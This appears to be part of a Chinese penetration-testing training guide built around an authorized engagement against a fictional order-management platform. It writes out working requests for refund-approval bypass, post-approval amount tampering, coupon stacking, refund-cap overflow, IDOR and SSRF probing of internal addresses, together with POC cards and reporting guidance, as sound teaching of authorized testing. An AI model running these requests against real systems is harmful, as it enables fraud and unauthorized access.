D9，进入资金区。从这里开始，每个动作出发前都要先摸清回程票在哪。本幕前三分之一的时间会花在"像个正常运营一样走完合法流程"上——这不是保守，是在给后面每一次越界演示买保险。悬念压在状态机对照表的最后三行：应然与实然，到底差多远。

**【状态面板】D10 12:00**

| 项 | 内容 |
|---|---|
| 已知事实（assets） | 合法业务流实测走通：`POST /refunds`（提交）→ `first-approval`（senior_operator）→ `final-approval`（finance）→ 出款队列；**缺陷实测**：两个审批接口只校验"平台登录用户"，**不校验角色也不校验单据当前状态**；`PATCH /refunds/{id}` 在 first-approval 之后仍可改 `amount_fen` 且**不重置审批状态**、不产生金额变更审计记录 |
| 当前假设 | H6-1「审批状态机与角色校验全在客户端/流程层，服务端只认'登录即可批'」（**Certain**，三组实验闭环）→ F-03；H6-2「同类'跳步'模式可能存在于 /orders 的撤销/修改链」（Tentative，留复测） |
| 预算消耗 | 65 / 80 人时 |
| 覆盖台账增量 | 已测：退款流合法路径全走查（沙箱商户 TEST-SHOP-002）；顺序绕过（A 原语）与金额篡改（B 原语）各一组对照实验；零售变体对照：互斥券叠加（L-05）、退款上限漂移（L-06）各一组（见 6.3 增补，并入 F-03 修复范围）；撤销恢复验证。明确不测：真实商户单（r2）；批量并发审批竞态（异步出款队列的时序攻击超出非破坏边界）；对账/财务下游系统（scope 外） |

### 6.1 【因果】为什么最后打资金流，以及为什么必须先走合法路径

此刻应然矩阵里只剩一块高价值空白：`/refunds/approval` 页面 operator 进不去（第二幕已证），但接口对 operator 的"实然"从未验证——这是身份矩阵最后一批未知格，且落在**资金**这一最高业务权重上。但顺序上有条铁律：**先走通合法路径，再谈非法路径**。不亲眼看过完整状态机（提交→初审→终审→出款→对账），你既不知道"绕过"要绕过什么，也不知道撤销出口在哪（非破坏的保险绳）。于是本幕的前 1/3 预算花在"像个正常运营一样干活"上——这不是浪费，是给后面每一次越界动作买回程票。

### 6.2 【原理】状态机的服务端强制与 TOCTOU

工作流类漏洞的通用根因：**流程约束存在于设计文档与前端向导里，服务端接口只实现了原子动作**。审批流的安全假设是"只有处于 X 状态的单据才能被 Y 角色推到 Z 状态"，这要求每个转移接口校验三件事：调用者角色（谁）、单据当前状态（何时）、转移合法性（从哪到哪）。本平台三个都缺：first/final-approval 只认登录态——顺序绕过（从 submitted 直达 final）与角色冒用（operator 批 operator 的单）是同一根因的两个投影。

金额篡改（B 原语）是 TOCTOU（检查与使用的时间差）在审批域的变体：初审者**看到并批准的是 1 分**，批准后发起人仍可 PATCH 成 2 分，状态不重置、审计不记录——终审界面若按单据当前值展示，两个审批者审的其实是两个不同的数字，出款取的是后者。防御上的对应物是：可变字段修改必须**重置状态机到起点** + 审批快照（批准时的金额进日志）+ 服务端金额与单据绑定校验。

应然状态机 vs 实测转移（实测补全后即 F-03 的证据骨架）：

```text
应然（设计意图）：                 实测（黑盒可观测转移）：
submitted ──senior──▶ first        submitted ──任何人──▶ final   ← 状态+角色校验缺失
first ──finance──▶ final           first ──任何人──▶ final
final ──出款队列──▶ paid           PATCH 在已审批态仍有效且不回退状态
任意态 ──发起人──▶ cancelled        cancel 在 final 之后仍可由发起人触发
```

（上图即 `evidence/F03-statemachine.tsv` 的可视化，报告第六章直接引用。）

### 6.3 【操作】

合法路径先走一遍（沙箱商户，全程 journal 计次）：

```bash
$ T=$(jq -r .access_token sessions/ops01.json)
$ curl -s -X POST https://oms.yunfan.example/api/v1/refunds -H "Authorization: Bearer $T" \
    -d '{"order_id":"TEST-ORD-0091","amount_fen":1,"reason":"pentest-sandbox-trace-01"}'
{"code":0,"data":{"refund_id":"RF-20260914-0007","state":"submitted","amount_fen":1}}
```

A 原语·顺序绕过（operator 直接终审）：

> 🧭 **导游词（观察）**：合法路径给你的不只是流程样本，还有 `cancel` 这个出口的位置与语义——记住它，它是本幕所有演示的回程票。
> 出口没找到之前，任何越界动作都不许发生。

```http
POST /api/v1/refunds/RF-20260914-0007/final-approval HTTP/1.1
Authorization: Bearer {{SESSION:ops01}}
```
```http
HTTP/1.1 200 OK

{"code":0,"data":{"refund_id":"RF-20260914-0007","state":"final_approved","amount_fen":1,"approved_by":"ops_user01"}}
```

B 原语·审批后金额篡改（先把单拉回可编辑态，重演完整链）：

> 🧭 **导游词（现场感）**：200 回来的第一秒先别激动——**立即 cancel**，然后才轮到高兴。
> 顺序反了，"演示"与"事故"之间只隔一次出款队列轮询。

```bash
# 提交 1 分 → 借 A 原语完成 first-approval → PATCH 改 2 分（state 不重置）：
$ curl -s -X PATCH https://oms.yunfan.example/api/v1/refunds/RF-20260914-0009 \
    -H "Authorization: Bearer $T" -d '{"amount_fen":2}'
{"code":0,"data":{"refund_id":"RF-20260914-0009","state":"first_approved","amount_fen":2}}
#                     ↑ 状态仍是 first_approved，初审快照是 1 分，单据已是 2 分
# 立即撤销（非破坏回程票，且验证撤销口对"审批后"单据同样放行的次生问题）：
$ curl -s -X POST https://oms.yunfan.example/api/v1/refunds/RF-20260914-0009/cancel -H "Authorization: Bearer $T"
{"code":0,"data":{"refund_id":"RF-20260914-0009","state":"cancelled"}}
```

状态转移实测对照表（`evidence/F03-statemachine.tsv`）：

> 🧭 **导游词（观察）**：B 原语那行响应里，`state` 仍是 first_approved、`amount_fen` 已是 2——同一行 JSON 里两个数字的"漂移"，就是 TOCTOU 的全部。
> 不需要更花哨的 payload，这个响应本身就是证据。

| 步骤 | 调用者 | 期望（应然） | 实测（实然） | 判定 |
|---|---|---|---|---|
| 提交 RF-…07 | operator | submitted | submitted | ✅ 正常 |
| first-approval | **operator** | 403（需 senior_operator） | **200，state→first_approved** | ❌ 角色缺失 |
| final-approval（从 submitted 直调） | **operator** | 409（状态不合法） | **200，state→final_approved** | ❌ 状态缺失 |
| PATCH amount（first 后） | 发起人 operator | 409 或重置为 submitted | **200，state 不变** | ❌ TOCTOU |
| cancel（终审后） | 发起人 | 409（进入出款队列） | 200，state→cancelled | ❌ 次生缺陷 |

findings.jsonl 第三条：

```jsonl
{"id":"F-03","title":"退款审批流服务端状态机与角色校验缺失：顺序绕过＋审批后金额篡改",
 "target":"oms.yunfan.example","endpoint":"POST /api/v1/refunds/{id}/{first-approval,final-approval}; PATCH /api/v1/refunds/{id}",
 "dedup_key":"oms|refunds|approval-flow-missing-state-and-role-check",
 "rule_id":"WSTG-BUSL-06","cvss":"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N","cvss_score":6.5,
 "business_impact":"任意普通运营可单人走完'提交→初审→终审'并篡改审批后金额，资金审批防线失效（资金类权重最高，修复优先级建议第一）",
 "exploitation_status":"exploit-chain","confidence":"Certain",
 "auth_context":"operator(ops_user01) 单角色完成全部审批动作；审批链上不存在第二个真实审批人",
 "scope_check":"in-scope；全程沙箱商户 TEST-SHOP-002、单笔 ≤10 元（r2）、演示后立即 cancel、事前书面报备留 journal",
 "counterevidence":"出款队列异步执行未被触发（cancel 先于出款轮询，无真实资金动作）；金额上限 10 元由测试商户策略保证而非平台校验（平台侧无上限这一事实已写入影响描述，未验证绕过）",
 "evidence":["evidence/F03-statemachine.tsv","evidence/F03-seq-*.txt"],"poc_ref":"poc/F-03.yaml",
 "remediation":"审批接口服务端三重校验（角色×状态×转移表）；可变字段修改重置状态机并快照审批值；金额与原订单对账绑定；cancel 权限按状态收紧；全链路审计日志","discovered_at":"2026-09-15T15:20:00+08:00"}
```

#### 6.3 增补：零售高频变体——优惠券叠加与退款上限（同根因，点到可复现验证为止）

零售生态里，审批/资金流的日常皮是促销与售后：券、折扣、积分每天高频流转，而它们的规则校验与第六幕主样本一样，常被留在前端向导与流程约定里。两个变体各做一组对照即停（沙箱商户＋测试券，r2/r3 纪律不变）：根因与 F-03 同源（服务端缺"角色×状态×对账"三重校验中的对账与互斥维度），故登记 leads 并入 F-03 修复范围，不另开新 finding。

**变体一·优惠券叠加（互斥券并行生效）**：下单页 UI 只允许单选一张券，接口却收数组——

```http
POST /api/v1/orders/checkout HTTP/1.1
Host: oms.yunfan.example
Authorization: Bearer {{SESSION:ops01}}
Content-Type: application/json

{"order_id":"TEST-ORD-0102","coupon_ids":["C-9517","C-9538"],"pay_channel":"sandbox"}
```
```http
HTTP/1.1 200 OK

{"code":0,"data":{"order_id":"TEST-ORD-0102","amount_list_fen":9800,
 "discount":[{"coupon":"C-9517","type":"满减","off_fen":2000},
             {"coupon":"C-9538","type":"折扣","off_fen":980}],
 "payable_fen":6822,"note":"双券已生效"}}
```

判据与停点：响应同时列出两张互斥券的折扣、payable 按叠加计算（UI 对照：任选其一分别为 7800 / 8820）→ 服务端未复验互斥规则。验证即止：不支付，立即 cancel（沙箱通道本就走不通真实支付）。

**变体二·退款上限漂移（退款额越过实付金额）**：沿用 F-03 的 B 原语，只改目标值——订单原价 10000 分、券后实付 8000 分，把退款单 PATCH 到 10000 分：

```bash
$ curl -s -X PATCH https://oms.yunfan.example/api/v1/refunds/RF-20260916-0003 \
    -H "Authorization: Bearer $T" -d '{"amount_fen":10000}'
{"code":0,"data":{"refund_id":"RF-20260916-0003","state":"first_approved","amount_fen":10000}}
#                    ↑ 服务端未与原订单实付（8000）对账：券补的部分可被"退"走 → 验证即止，立即 cancel
```

顺手闭合一笔旧账：F-03 的 counterevidence 里"平台侧无上限、未验证绕过"一句，由本变体在 D10 上午补测闭合。修复建议仍用首测原文"金额与原订单对账绑定"，只需在验收用例表加两行（互斥券并行、退款>实付）。登记：

```jsonl
{"id":"L-05","title":"下单接口优惠券互斥校验缺失（叠加滥用变体）","dedup_key":"oms|POST|/api/v1/orders/checkout|coupon-exclusive-missing","status":"merged-into-F-03-remediation","confidence":"Certain","note":"沙箱单已撤销"}
{"id":"L-06","title":"退款金额未与订单实付对账（上限漂移变体）","dedup_key":"oms|PATCH|/api/v1/refunds/{id}|refund-cap-unbound","status":"merged-into-F-03-remediation","confidence":"Certain","note":"沙箱单已撤销"}
```

| 变体 | 零售高频度 | 根因维度 | 复现判据 | 停点 |
|---|---|---|---|---|
| 券叠加（L-05） | 大促日常 | 互斥规则只在前端 | 双券折扣并列且 payable 叠加 | 不支付，cancel |
| 退款上限（L-06） | 售后日常 | 金额×实付对账缺失 | amount_fen 越过实付仍 200 | 不出款，cancel |

### 6.4 【验证】

① 状态机对照表每行有"期望/实测/证据"三列，期望值引用第二幕应然矩阵（不靠记忆）；② 三组实验均可重放（RF-…07/…08/…09 三个单据号留档，Burp 条目对应）；③ 非破坏闭环：三单终态均为 cancelled，客户侧对账在复测时确认零出款；④ A、B 原语各自独立成立（B 不依赖 A 亦可由"真实初审后篡改"触发——已用周工配合的一次真实初审复验，见 evidence/F03-real-first-approval.txt）。

### 6.5 【陷阱】

- **金额单位换算**：接口用 `amount_fen`（分），页面用元。第一次 PATCH 传了 0.02 被幂等拒绝（非整数分）——单位搞错轻则白跑，重则误报"有校验"。
- **审计留痕的两面性**：每个越界动作都会进客户运营日志。事前书面报备（测试单号段 RF-20260914-0007~0009 + 操作窗口）让这些痕迹事后可归属为测试，否则你要花双倍时间自证清白。
- **"页面不显示"再坑一次**：operator 的界面根本没有审批按钮——若只测 UI 走查，这个洞零痕迹。逻辑漏洞的战场永远在报文层，不在页面层（VOL-07-08 A2"响应即真相"的极端体现）。
- **竞态冲动**：并发压审批接口能演示更炫的洞，但异步出款队列使结果不可即时回滚——非破坏原则（r2）直接排除该路径，登记 coverage ruled_out。

### 6.6 【AI 位】

AI 能做：① 从 23 端点清单生成"状态机候选接口差集"（哪些 POST 接口名含状态动词却从未被 ops_user01 合法触发过）；② 把状态转移实测表转成 mermaid 状态图附进报告；③ 起草修复建议的"校验矩阵"（角色×状态×转移）。人必须守住：**涉资金动作人在环**——本幕每个改变单据状态的请求都是人工逐条发出与核对（AI 全程只读证据、不持会话）；"演示影响"到可复现验证为止（r2），出款、对账、批量场景一律不做；与周工的配合初审留书面记录，AI 不得代拟客户沟通。

### 6.7 幕末目录树快照 v6

```text
2026-09-07-yunfan-oms/
├── journal.jsonl             # 43 行（含 3 个测试单号的完整生命周期计次）
├── hypotheses.jsonl          # H6-1 Certain；H6-2 pending（订单链同类跳步，复测建议）
├── findings.jsonl            # 3 行（F-01/F-02/F-03）
├── poc/
│   ├── f01_idor_sample.py    ├── F-02.yaml(草)    └── F-03.yaml(草)
├── evidence/
│   ├── F03-statemachine.tsv  ├── F03-seq-07.txt / -08.txt / -09.txt
│   └── F03-real-first-approval.txt   # 客户配合复验 B 原语
└── coverage/coverage.json    # +退款流：reported；并发竞态：ruled_out（r2）；下游对账：out_of_scope
```

> **上帝视角旁白**：这个洞六个月前就由外包团队引入（重构时把审批校验从"网关层"挪进了"前端向导"，网关层旧校验被顺手删除）。旧报告没发现它，因为当时审批流还没上线。**逻辑漏洞是跟着业务长出来的**——这也是为什么覆盖台账要按"业务流"而不只是"接口"记账。

---

## 第七幕 证据固化与 POC 卡片（D10 下午–D11）

D11，情报期正式结束。今天不产生任何新发现，只把十二天里散落在 Burp 历史、journal 和终端滚屏里的东西，变成"一个陌生人十分钟内能复现"的形态。你会经历整场交战最枯燥也最值钱的几个小时：逐字核对、算哈希、跑重放。交付物的成色，今天定型。

**【状态面板】D11 18:00**

| 项 | 内容 |
|---|---|
| 已知事实（assets） | 3 个 VERIFIED finding 的证据全部成对留档（请求/响应/时间戳/Burp 条目号）；证据包统一 SHA256 清单（`evidence/MANIFEST.sha256`）；POC 卡片 3 张过"独立重放门"（fresh 会话盲发复现） |
| 当前假设 | 无新增——本幕不产生新情报，只把已有情报变成**可交付形态** |
| 预算消耗 | 71 / 80 人时 |
| 覆盖台账增量 | 已测（对证据本身）：每张卡独立重放一次成功；脱敏终检（secret-pattern 扫描 report/findings/logs 零命中）。明确不测：无（本幕是纯工程幕） |

### 7.1 【因果】为什么证据固化是独立的一幕，而不是"顺手做"

三个 finding 分散在 12 天、上百条 Burp 记录里。客户的修复工程师**不咨询你**就要复现（VOL-07-08 B2 的合格标准：10 分钟内复现）；复测（三周后）的输入也是这些卡片而非你的记忆。证据固化的信息缺口是**"第三方可复现性"**——它决定交付物成立与否，值一整幕预算。顺序上放在报告（第八幕）之前：卡片是报告漏洞明细章的直接素材，先卡后报告，报告就只是"渲染"。

> 🧭 **导游词（节奏）**：写卡片时最容易发生的预算泄漏是"顺手再测一把确认一下"。
> 本幕起，任何"再测一把"都是新测试——要么进 leads 留给复测，要么不做。固化期的手要比侦察期更稳。

### 7.2 【原理】证据链与独立重放门

证据链 = 原始报文成对留存 + 时间戳 + 判定标准 + 哈希清单。任何结论可被第三人回放（VOL-07-08 A2"响应即真相"）。POC 卡片把这个要求固化成契约字段（VOL-09C ⑥）：`env.network_position`（从哪打——中文报告被质疑"复现不了"的第一原因就是缺它）、`preconditions`（角色/业务状态前置）、`raw_request`（完整原始报文，凭据用占位符）、`expected.matcher`（机器可判定的成功判据）、`cleanup`（收尾动作，逆序执行）。**独立重放门**：每张卡由无上下文的新会话（占位符本地回填、盲发）复现出 expected 才置 VERIFIED——这道门拦的是"我这里能复现、客户那里不能"的交付事故，也顺带拦住 AI 起草卡片的幻觉字段。

### 7.3 【操作】三张 POC 卡片（完整可复制）

`poc/F-01.yaml`：

```yaml
id: F-01
title: 订单详情接口水平越权（IDOR）
rule_id: WSTG-ATHZ-04
severity: {cvss: 6.5, vector: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N", level: 中危}
env:
  network_position: 互联网 → https://oms.yunfan.example（经 CDN；无需 VPN/内网位置）
  toolchain: [curl-8.6, Burp-2026.6]
preconditions:
  - 持有任意 operator 角色账号（本卡用 {{CRED:ops01}}，uid=77）
  - 存在相邻单号（本人单 1042，邻单 1043 由 uid=81 创建）——换环境后需先定位自己的单号区间
raw_request: |
  GET /api/v1/orders/1043 HTTP/1.1
  Host: oms.yunfan.example
  Authorization: Bearer {{SESSION:ops01}}
  User-Agent: Mozilla/5.0
steps:
  - 以 {{CRED:ops01}} 登录获取 access_token（POST /api/v1/auth/login）
  - 发送 raw_request（邻单 id）
  - 对照：将 id 换成本人单 1042 与不存在的 99999 各发一次
expected:
  matcher:
    - status_code == 200                       # 邻单请求
    - body.creator_uid == 81 && body.creator_uid != 77
    - counter_case: 本人单 200 且 creator_uid == 77
    - counter_case: id=99999 → 404；未登录 → 401
cleanup: []            # 只读操作，无残留
evidence: [evidence/F01-1043-req.txt, evidence/F01-1043-resp.txt, evidence/F01-sample.txt]
evidence_sha256: {F01-sample.txt: "5b1f…c9d2"}
notes: 采样 ≤3 条（scope r3）；响应落盘前 buyer_phone 已脱敏
```

`poc/F-02.yaml`：

> 🧭 **导游词（观察）**：读卡片最容易被跳过的是 expected 里的 counter_case 行——
> 独立重放时正是它们区分"完全复现"与"复现一半"。反证写不进卡片，卡片就只能在理想环境里成功。

```yaml
id: F-02
title: 未公开移动端接口 SSRF（webhook 探测）
rule_id: WSTG-INPV-19
severity: {cvss: 4.6, vector: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N", level: 中危}
env:
  network_position: 互联网 → oms.yunfan.example；探测目标为服务端内网位置（10.10.20.0/24，授权限可达性验证）
  toolchain: [curl-8.6, 自有回连域 oob.lab.example]
preconditions:
  - 任意 operator 账号（{{CRED:ops01}}）
  - v2 端点对 operator 开放（端点情报来自 field-app.apk 2.4.1 逆向，见 assets/apk-intel.json）
raw_request: |
  POST /api/v2/field/webhook/test HTTP/1.1
  Host: oms.yunfan.example
  Authorization: Bearer {{SESSION:ops01}}
  Content-Type: application/json
  Content-Length: 30

  {"url":"http://10.10.20.31:8080/"}
steps:
  - 登录取 token（同 F-01 步骤 1）
  - 发送 raw_request；依次替换 url：oob.lab.example（正对照）/ 10.10.20.1 / 10.10.20.31:8080 / 10.10.20.254 / 10.10.20.200（负对照），每次间隔 ≥30s
expected:
  matcher:
    - 10.10.20.31 请求 → status_code == 200 && body.data.reachable == true && body.data.status == 200
    - body.data.body_head contains "yf-taskcenter"
    - counter_case: 10.10.20.200 → reachable == false（connect timeout）
cleanup:
  - DELETE 已注册 webhook（若用 register 端点注册过）：POST /api/v2/field/webhook/delete {"webhook_id":"{{WID}}"}
evidence: [evidence/F02-req-01.txt, evidence/F02-probe-matrix.tsv, evidence/F02-oob-catch.png]
notes: 内网目标白名单来自 scope r1 + 报备邮件（journal 2026-09-14T09:12）；严禁替换为云元数据地址（r4）
```

`poc/F-03.yaml`：

```yaml
id: F-03
title: 退款审批流顺序绕过 + 审批后金额篡改
rule_id: WSTG-BUSL-06
severity: {cvss: 6.5, vector: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N", level: 高危（业务权重，见 8.3）}
env:
  network_position: 互联网 → oms.yunfan.example
  toolchain: [curl-8.6]
preconditions:
  - 任意 operator 账号（{{CRED:ops01}}）
  - 测试商户沙箱单（TEST-SHOP-002，单笔 ≤10 元，scope r2）；重放前向客户报备单号段
raw_request: |
  POST /api/v1/refunds/RF-20260914-0007/final-approval HTTP/1.1
  Host: oms.yunfan.example
  Authorization: Bearer {{SESSION:ops01}}
steps:               # A 原语（顺序+角色绕过）
  - 提交退款单：POST /api/v1/refunds  {"order_id":"TEST-ORD-0091","amount_fen":1,"reason":"pentest-{{RUN_ID}}"} → 记 refund_id
  - 不经 first-approval，直接 POST /{refund_id}/final-approval
  - B 原语：新单提交后借 A 完成 first-approval，再 PATCH /{refund_id} {"amount_fen":2}，确认 state 仍为 first_approved
  - 立即 POST /{refund_id}/cancel（cleanup 硬性步骤，缺此步不得执行本卡）
expected:
  matcher:
    - A: final-approval 响应 status_code == 200 && body.data.state == "final_approved" && body.data.approved_by == "ops_user01"
    - B: PATCH 响应 status_code == 200 && body.data.state == "first_approved" && body.data.amount_fen == 2
    - counter_case: 以未登录态调 final-approval → 401（证明缺的是角色/状态校验，不是鉴权）
cleanup:
  - 逆序执行：cancel 所有未终态测试单；向周工回传单号清单（对账核验零出款）
evidence: [evidence/F03-statemachine.tsv, evidence/F03-seq-07.txt, evidence/F03-seq-09.txt]
notes: 沙箱单号命名规范 pentest-{{RUN_ID}} 前缀，客户可按前缀过滤审计日志
```

### 7.4 【验证】

① 三张卡逐张过独立重放门：新终端、只给卡片+占位符回填值，10 分钟内复现 expected（F-01 计时 4 分钟、F-02 计时 6 分钟、F-03 计时 8 分钟）；② MANIFEST.sha256 覆盖 evidence 全部文件，任一文件改动即失配；③ 脱敏终检：`grep -rE "密码|Bearer eyJ|AK-" reports/ findings.jsonl` 零命中（占位符除外）；④ findings.jsonl 三条的 poc_ref 与卡片文件一一对应。

> 🧭 **导游词（现场感）**：fresh 终端里 4 分钟复现 F-01 时，你以为那是自己的熟练——
> 不，那是卡片的合格。换一个同事拿同一张卡，也应该 4 分钟。

### 7.5 【陷阱】

- **卡片里写页面操作**："点击订单-详情-按 F12"——修复工程师环境里没有你的浏览器会话。卡片只含报文级步骤。
- **cleanup 形同虚设**：F-02 若注册过 webhook 而不删除，复测时客户环境里还躺着你的回调注册记录——cleanup 是卡片必填字段不是装饰（VOL-09C ⑫）。
- **哈希清单晚做**：交付前统一算哈希会漏掉中途改名的文件；证据落盘时即算、MANIFEST 增量更新。

### 7.6 【AI 位】

AI 能做：① 从 journal/evidence 自动起草卡片草稿（提示思路：*"依据 journal 中 F-03 相关条目与 evidence 报文，按 POC 卡契约生成 YAML；matcher 必须引用响应中的具体字段与值；preconditions 里写清非显然的前置"*）；② 跑脱敏终检与 MANIFEST 核对脚本；③ 交叉校验卡片与 findings 字段一致性。人必须守住：**独立重放门必须由人（或确证无上下文的 fresh 会话）执行并计时**；matcher 的判定字段人核对——AI 常把"复现"写成"预期"，一字之差就是交付事故（VOL-09C 验收纪律）。

### 7.7 幕末目录树快照 v7

```text
2026-09-07-yunfan-oms/
├── poc/
│   ├── F-01.yaml  F-02.yaml  F-03.yaml     # 三张已过独立重放门（replay.log 计时记录）
│   ├── f01_idor_sample.py
│   └── replay.log                          # 独立重放门执行记录（4/6/8 分钟）
├── evidence/
│   ├── MANIFEST.sha256                     # 全量证据哈希清单
│   └── …（F01/F02/F03 报文、矩阵、状态机表、截图）
└── reports/                                # 空——下一幕开始生长
```

---

## 第八幕 中文报告骨架与 CVSS 定级（D12）

D12，报告日，契约的红利今天兑现：findings、coverage、卡片都躺在目录里，报告只是一次渲染。真正要"写"的只剩两处——给决策层的三句话、给修复排期者的定级辩护词。今天最大的敌人不是工作量，而是"再测一把让报告更完美"的冲动。

**【状态面板】D12 18:00**

| 项 | 内容 |
|---|---|
| 已知事实（assets） | 报告 v1.0 全文 42 页完成：3 主发现 + 2 leads（L-01 硬编码 AK、L-04 初始口令策略）+ 3 旧报告复核结论；CVSS 三条向量本地库重算与卡片一致 |
| 当前假设 | 无新增；报告阶段禁止产生新攻击假设（防止"再测一把"拖垮预算） |
| 预算消耗 | 76 / 80 人时 |
| 覆盖台账增量 | 已测（对交付物）：CVSS 本地重算、报告 schema lint、脱敏终检二次执行。明确不测：无 |

### 8.1 【因果】为什么报告是"渲染"而不是"创作"

工程契约的红利在此兑现：findings.jsonl + coverage.json + POC 卡片齐备后，报告 = 确定性渲染（VOL-09C ⑧"报告=一条命令的确定性重建"）。写作的真正工作量只剩两块：**摘要的三句话**（给决策层）与**定级的辩护词**（给修复排期者）。这也是预算只给一天的原因——所有事实早已落盘，报告阶段不产生新事实。

> 🧭 **导游词（现场感）**：打开 report.zh.md 会发现要"写"的只剩摘要一页——
> 这不是轻松，是前十一天的契约在替你打工。此刻的正确反应是"不对劲"，然后把数字核三遍。

### 8.2 【原理】CVSS 定级与业务权重的关系

CVSS 3.1 度量的是漏洞的**技术可达性与 CIA 影响**，不度量资产的业务权重。本交战最典型的对比：F-01 与 F-03 基础分同为 6.5，但 F-03 触碰资金完整性（business_impact 最高枚举），修复排期必须第一。这就是 findings 契约里 cvss 与 business_impact 并列的原因（VOL-09C ⑧）：前者保证行业可比性，后者保证甲方排期的正确性。定级计算用本地库重算（向量串→分数），**不引用任何在线计算器**——可复核、可离线、可复算。

### 8.3 【操作】

报告骨架（`reports/report.zh.md`，结构对齐 VOL-07-08 B1）：

```text
1 封面与版本（v1.0 / 2026-09-18 / 密级：客户 CONFIDENTIAL）
2 摘要（一页）：三句话 + 风险汇总表
3 测试范围与方法（scope 摘录、窗口、身份、方法论引用 WSTG）
4 风险汇总与定级
5 漏洞明细（每洞一张 POC 卡片渲染 + 证据索引）
6 攻击链叙事（Kill Chain 视角：APK→v2→SSRF→内网边缘 的路径还原，2 页）
7 覆盖度与局限性（coverage.json 渲染：测了什么/没测什么/为什么——needs_follow_up 清单）
8 修复建议汇总（立即/短期/长期三层）
9 复测安排与四态口径
附录 A 授权与边界（scope.yaml 渲染 + amendments 空表）
附录 B 旧报告复核结论（O-1/O-2/O-3）
附录 C 审计线索（测试产生的单据号/日志特征，供客户回查）
```

摘要三句话（给决策层的全部分量）：

> 运营管理平台存在三个中危级别技术发现，其中**退款审批流校验缺失**使任意普通运营可单人完成本应双人审批的资金操作，建议 7 日内修复。订单接口水平越权导致跨运营人员的客户个人信息可被读取，与审批缺陷同源于"服务端只认功能级权限"的架构习惯。后端网段从公网不可直达，但移动端遗留接口提供了内网可达性探测通道，建议随 SSRF 一并收敛。

CVSS 定级表：

> 🧭 **导游词（观察）**：第一句话的主语是"任意普通运营"，不是"ops_user01"——
> 报告语言的切换就在这里：从"我做了什么"变成"谁能做什么"。换掉主语，整段话的分量立刻不同。

| 编号 | 向量 | 分数 | 等级 | 业务权重 | 修复排期建议 |
|---|---|---|---|---|---|
| F-03 | AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N | 6.5 | 中危 | **资金完整性——最高** | 立即（7 日） |
| F-01 | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N | 6.5 | 中危 | 个人信息泄露——高 | 短期（14 日） |
| F-02 | AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N | 4.6 | 中危 | 内网信息泄露——中 | 短期（30 日，随 v2 下线评估） |
| L-01 | 硬编码测试 AK（未验证利用） | — | 低危/管理类 | 待客户确认归属 | 短期（30 日轮换） |
| L-04 | 全员初始口令策略弱 | — | 管理类 | — | 长期 |

修复建议分层（节选）：

> 🧭 **导游词（节奏）**：定级表交出去后，客户的第一通电话多半是来"谈分"的。
> 把这句话备好再说出口：分数来自向量，改分先改向量，改动进 amendments——顺序不能反。立即层 = 审批接口三重校验（角色×状态×转移表）＋审批快照；短期层 = 订单查询归属过滤、webhook 白名单与 v2 端点收敛；长期层 = 对象级鉴权框架（中间件统一注入归属过滤）、多角色测试账号纳入下次交战 scope、API 双代生命线治理。

### 8.4 【验证】

① 定级表每行的分数由 `cvss-local calc <vector>` 重算并留终端记录；② 报告 schema lint 通过（章节齐全、每洞有卡片引用与证据索引）；③ 摘要三句话与正文无矛盾（数据、单号、日期逐一对账）；④ 交付包 = report.zh.md + report.pdf + evidence 包（含 MANIFEST）+ poc/ 三卡，缺一不可。

### 8.5 【陷阱】

- **摘要写成目录**：决策层只读这一页，三句话必须能独立成立（哪类人、能干什么、建议何时修）。
- **CVSS 临时调分**：客户压力下"改到低危"是红线——分数来自向量，改动必须改向量并留记录（amendments）。
- **覆盖度章节写成自夸**：该章的价值在诚实列出 needs_follow_up（/customers 同类面、订单链跳步、v3 网关情报缺失）——它同时是复购说明书（VOL-09C ⑨）。

### 8.6 【AI 位】

AI 能做：① 从 findings/coverage 渲染报告初稿与风险汇总表；② CVSS 向量→中文影响描述的模板化翻译；③ 摘要三句话的多版本起草（供人挑）。人必须守住：**摘要与定级签字权**——三句话是人对客户的承诺；所有数字（单号、时间、分数）逐一对账后才可署名交付；AI 稿中的"建议性措辞"（如"建议立即下线 v2"）必须按合同边界收敛为客户可执行的分层建议。

### 8.7 幕末目录树快照 v7.5

```text
2026-09-07-yunfan-oms/
├── reports/
│   ├── report.zh.md → report.pdf        # v1.0（09-18）→ v1.2（09-21 答疑修订）
│   ├── evidence-bundle.zip              # evidence/ + MANIFEST 打包
│   └── report.schema.json               # 渲染 schema（lint 输入）
├── coverage/coverage.json               # 渲染终态：reported×6 / ruled_out×3 / follow_up×2
└── findings.jsonl                       # 3 行（F-04 属复测新增）
```

---

## 第九幕 复测与四态判定（2026-10-09）

三周后，10 月 9 日，你带着三张旧卡片回到同一个平台。不测新东西，只问一个问题：上次说的，现在还在吗？判定只有四态，每一态都要有重放响应撑腰。真正的悬念藏在 F-02——修复要么完整，要么只是换了一种失败的方式。

**【状态面板】复测日 18:00**

| 项 | 内容 |
|---|---|
| 已知事实（assets） | 复测授权沿用原范围（窗口 2026-10-09 单日）；三张卡原样重放完毕：F-01 → 403；F-02 → 直连 IP 被拦，**但 302 跳转变体仍可达**；F-03 A 原语 → 403（已加角色校验），B 原语 → 仍 200（PATCH 未收口）；O-1 → 已修复维持 |
| 当前假设 | H9-1「F-02 修复采用黑名单/禁直连 IP，未覆盖重定向」（Certain，变体已复现）→ 新条目 F-04；H9-2「F-03 修复分批上线，状态校验先行、金额快照未上线」（Firm，待客户排期确认） |
| 预算消耗 | 复测 4 / 4 人时（主窗口 76/80 结余不结转） |
| 覆盖台账增量 | 已测：三卡原样重放 + F-02 变体一次验证（重定向到 10.10.20.31 仍返回 reachable）。明确不测：F-02 变体的完整绕过矩阵（属新一轮修复验证，建议下次交战）；回归面（v1 相邻接口）抽查 2 个无异常即止 |

### 9.1 【因果】为什么复测是"原样重放"而不是"重新测试"

